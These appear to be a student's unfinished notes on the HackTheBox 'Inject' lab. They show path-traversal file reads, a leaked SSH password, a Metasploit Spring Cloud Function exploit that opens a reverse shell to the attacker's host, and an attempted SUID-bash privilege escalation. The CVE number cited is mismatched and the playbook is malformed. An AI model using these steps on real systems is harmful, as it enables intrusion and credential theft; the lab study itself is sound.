-----

## Initial Information-

### IPs

- Victim  -  10.10.11.204


Date Started:2023-04-14

----
## Initial Recon

- did the initial scan  nmap 
```shell
nmap -sV -sC -sS  -p- inject.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-14 06:16 EDT
Nmap scan report for inject.htb (10.10.11.204)
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.96 seconds

```

Went to the browser entering {IP}:8080 which brings us to the home page
![[Pasted image 20230414114749.png]]
- Initil recon on the the page shows that there is a register page that is under construction(this will not be usalble). I did check the developer tools to see there was any hidden API this did turn up anything, an upload page for uploading files.
- The login button is not functionall as when it is clicked nothing happens
- On the blogs page we find names **admin** and **Brandon Auger** which could be potential users of the system  these could be potentially used for bruteforcing passwords
![[Pasted image 20230414115208.png]]

- Looking in the source code for the home page there are no hidden domains or emails and the same is the blogs page
-  in the upload page, I tested the type of files that could be uploaded. I found that you could only upload .png files.
- On the show image page I found that the URL in the browser looks like it pulls the image directly from the file server based on the url `http://inject.htb:8080/show_image?img=Home-Mobile.png`
- Based on the URL I then tried see if this server is vunrible to Local File inclusion in order to get passwd or user inforemation. 
- I set the request to the repeater  in burpsuite and tested the ../etc/passwd in order to find out where we are located and to get some of the users of site 
```shell
GET /show_image?img=../../../../../../etc/passwd HTTP/1.1

Host: inject.htb:8080

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

````

- based on this search I managed to find the user information for frank, phil and _laurel_
```shell
HTTP/1.1 200 

Accept-Ranges: bytes

Content-Type: image/jpeg

Content-Length: 1986

Date: Fri, 14 Apr 2023 13:00:49 GMT

Connection: close



root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
frank:x:1000:1000:frank:/home/frank:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
phil:x:1001:1001::/home/phil:/bin/bash
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:997:996::/var/log/laurel:/bin/false
```
- Based on some simple traversing I was able to access the phil home directory and found a user.txt and that he has a linpeas.sh that can preusumably executed 
```shell
GET /show_image?img=../../../../../../home/phil HTTP/1.1

Host: inject.htb:8080

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1


HTTP/1.1 200 

Accept-Ranges: bytes

Content-Type: image/jpeg

Content-Length: 4096

Date: Fri, 14 Apr 2023 13:13:03 GMT

Connection: close



.ansible
.bash_history
.bashrc
.cache
.gnupg
.local
.profile
linpeas.sh
rs.yml
user.txt

```



- in franks directory I found a .m2 file which doesnt appear to be standard
```shell
GET /show_image?img=../../../../../../home/frank HTTP/1.


.bash_history
.bashrc
.cache
.local
.m2
.profile

```

- Investigating further into the .m2 found that it contains a settings.xml file, in that xml file i found the ssh password for Phil
```xml

<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>


```
- in the www folder I found a HELP.md file that contains the following:
```shell


# Getting Started

### Reference Documentation
For further reference, please consider the following sections:

* [Official Apache Maven documentation](https://maven.apache.org/guides/index.html)
* [Spring Boot Maven Plugin Reference Guide](https://docs.spring.io/spring-boot/docs/2.6.6/maven-plugin/reference/html/)
* [Create an OCI image](https://docs.spring.io/spring-boot/docs/2.6.6/maven-plugin/reference/html/#build-image)
* [Spring Boot DevTools](https://docs.spring.io/spring-boot/docs/2.6.6/reference/htmlsingle/#using-boot-devtools)
* [Spring Web](https://docs.spring.io/spring-boot/docs/2.6.6/reference/htmlsingle/#boot-features-developing-web-applications)
* [Thymeleaf](https://docs.spring.io/spring-boot/docs/2.6.6/reference/htmlsingle/#boot-features-spring-mvc-template-engines)
* [Spring Data JPA](https://docs.spring.io/spring-boot/docs/2.6.6/reference/htmlsingle/#boot-features-jpa-and-spring-data)

### Guides
The following guides illustrate how to use some features concretely:

* [Building a RESTful Web Service](https://spring.io/guides/gs/rest-service/)
* [Serving Web Content with Spring MVC](https://spring.io/guides/gs/serving-web-content/)
* [Building REST services with Spring](https://spring.io/guides/tutorials/bookmarks/)
* [Handling Form Submission](https://spring.io/guides/gs/handling-form-submission/)
* [Accessing Data with JPA](https://spring.io/guides/gs/accessing-data-jpa/)
```
- Based on the information in the readme I found that it is using a spring web service
- In the WebApp folder we see that it contains a pom.xml that is readable and contains the springframework version 
```xml

HTTP/1.1 200 

Accept-Ranges: bytes

Content-Type: image/jpeg

Content-Length: 2187

Date: Fri, 14 Apr 2023 15:10:09 GMT

Connection: close



<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
	</parent>
	<groupId>com.example</groupId>
	<artifactId>WebApp</artifactId>
	<version>0.0.1-SNAPSHOT</version>
	<name>WebApp</name>
	<description>Demo project for Spring Boot</description>
	<properties>
		<java.version>11</java.version>
	</properties>
	<dependencies>
		<dependency>
  			<groupId>com.sun.activation</groupId>
  			<artifactId>javax.activation</artifactId>
  			<version>1.2.0</version>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-thymeleaf</artifactId>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-web</artifactId>
		</dependency>

		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-devtools</artifactId>
			<scope>runtime</scope>
			<optional>true</optional>
		</dependency>

		<dependency>
			<groupId>org.springframework.cloud</groupId>
			<artifactId>spring-cloud-function-web</artifactId>
			<version>3.2.2</version>
		</dependency>
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-test</artifactId>
			<scope>test</scope>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>bootstrap</artifactId>
			<version>5.1.3</version>
		</dependency>
		<dependency>
			<groupId>org.webjars</groupId>
			<artifactId>webjars-locator-core</artifactId>
		</dependency>

	</dependencies>
	<build>
		<plugins>
			<plugin>
				<groupId>org.springframework.boot</groupId>
				<artifactId>spring-boot-maven-plugin</artifactId>
				<version>${parent.version}</version>
			</plugin>
		</plugins>
		<finalName>spring-webapp</finalName>
	</build>

</project>


```
- Based on reseach on the internet found that the version of springframework has a vunrabileity attached cve-2022-22965. I then put in what was required to implement the exploit

```shell
exploit(multi/http/spring_cloud_function_spel_injection) > options

Module options (exploit/multi/http/spring_cloud_function_spel_injection):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:
                                         port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://gi
                                         thub.com/rapid7/metasploit-framewo
                                         rk/wiki/Using-Metasploit
   RPORT      8080             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interfac
                                         e to listen on. This must be an ad
                                         dress on the local machine or 0.0.
                                         0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing con
                                         nections
   SSLCert                     no        Path to a custom SSL certificate (
                                         default is randomly generated)
   TARGETURI  /functionRouter  yes       Base path
   URIPATH                     no        The URI to use for this exploit (d
                                         efault is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.11      yes       The listen address (an interface may b
                                     e specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper



View the full module info with the info, or info -d command.

```



----


## Foothold

- Running the exploit, I managed to get a shell
```shell
msf6 exploit(multi/http/spring_cloud_function_spel_injection) > set rhost inject.htb
rhost => inject.htb
msf6 exploit(multi/http/spring_cloud_function_spel_injection) > run

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp
[*] Sending stage (3045348 bytes) to 10.10.11.204
[*] Command Stager progress - 100.00% done (823/823 bytes)
[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.11.204:57480) at 2023-04-14 11:27:15 -0400

meterpreter > 

```
- I then used the details for phil to login so we can get the flag for user 
```shell
[-] core_channel_open: Operation failed: 1
meterpreter > shell
Process 98895 created.
Channel 2 created.
su phil
Password: DocPhillovestoInject123
ls
linpeas.sh
rs.yml
user.txt

cat user.txt    
fd58582c63be188c81736f39e5169445


```

-  given that there was no where else to look for root access I decided to look at what programs are running on the machine I found that ansible is being used
```shell
ls
automation
cd automation
ls
tasks
cd tasks 
ls
playbook_1.yml
cat playbook_1.yml
- hosts: localhost
  tasks:
  - name: Checking webapp service
    ansible.builtin.systemd:
      name: webapp
      enabled: yes
      state: started

```

- based on research I figured that I could use the playbook to give phil the root access. I also figured that I needed to somehow upload that file to the server
```shell
- hosts: localhost
  tasks:
  - name: Get Root
    ansible.builtin.systemd:
      command: chmod u+s /bin/bash
      become:true
      
```
- Tried to get the yml file to execute but everytime that I did it would purge the file from the folder.
- I went another route by uploading linpeas to the tmp folder as this is another attack vector that could be used,. I made that executable on the victim machine 
```shell
-rwxrwxr-x 1 phil  phil  825850 Apr 14 17:32 linpeas1.sh


```

- I found the binarys that are executable
---
## Tags

----
## Resources

- https://www.infosecmatter.com/metasploit-module-library/?mm=exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo
- Vunribility for Spring framework - https://security.berkeley.edu/news/vulnerability-spring-framework-cve-2022-22965
- Blog on Implementation - https://www.rapid7.com/blog/post/2022/04/01/metasploit-weekly-wrap-up-155/
- Privilage escalation with ansible: https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_privilege_escalation.html
- Reverse shell with script - https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit